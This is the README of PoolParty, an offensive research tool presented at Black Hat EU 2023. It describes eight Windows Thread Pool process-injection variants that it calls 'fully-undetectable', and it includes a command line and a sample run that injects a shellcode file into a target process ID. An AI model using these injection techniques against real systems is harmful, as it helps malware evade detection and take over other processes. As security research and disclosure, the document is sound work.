
# PoolParty
A collection of fully-undetectable process injection techniques abusing Windows Thread Pools. Presented at Black Hat EU 2023 Briefings under the title - [**The Pool Party You Will Never Forget: New Process Injection Techniques Using Windows Thread Pools**](https://www.blackhat.com/eu-23/briefings/schedule/#the-pool-party-you-will-never-forget-new-process-injection-techniques-using-windows-thread-pools-35446)

## PoolParty Variants

| Variant ID  | Varient Description |
| ------------- | ----------------- |
| 1  | Overwrite the start routine of the target worker factory       |
| 2  | Insert TP_WORK work item to the target process's thread pool   |
| 3  | Insert TP_WAIT work item to the target process's thread pool   |
| 4  | Insert TP_IO work item to the target process's thread pool     |
| 5  | Insert TP_ALPC work item to the target process's thread pool   |
| 6  | Insert TP_JOB work item to the target process's thread pool    |
| 7  | Insert TP_DIRECT work item to the target process's thread pool |
| 8  | Insert TP_TIMER work item to the target process's thread pool  |

## Usage
```
PoolParty.exe -V <VARIANT ID> -P <TARGET PID> -F <SHELLCODE FILE>
```

## Usage Examples

Insert TP_WORK work item to process ID 43988
```
> .\PoolParty\x64\Release\PoolParty.exe -V 2 -P 43988 -F .\demon.x64.bin
[info]    Loaded shellcode (290097 bytes) from: .\demon.x64.bin
[info]    Starting PoolParty attack against process id: 43988
[info]    Retrieved handle to the target process: 000000000000005C
[info]    Hijacked worker factory handle from the target process: 00000000000000BC
[info]    Allocated shellcode memory in the target process: 000001A820F80000
[info]    Written shellcode to the target process
[info]    Retrieved target worker factory basic information
[info]    Read target process's TP_POOL structure into the current process
[info]    Created TP_WORK structure associated with the shellcode
[info]    Modified the TP_WORK structure to be associated with target process's TP_POOL
[info]    Allocated TP_WORK memory in the target process: 000001A820FD0000
[info]    Written the specially crafted TP_WORK structure to the target process
[info]    Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK
[info]    PoolParty attack completed successfully
```

## Author - Alon Leviev
* LinkedIn - [Alon Leviev](https://il.linkedin.com/in/alonleviev)
* Twitter - [@_0xDeku](https://twitter.com/_0xDeku)
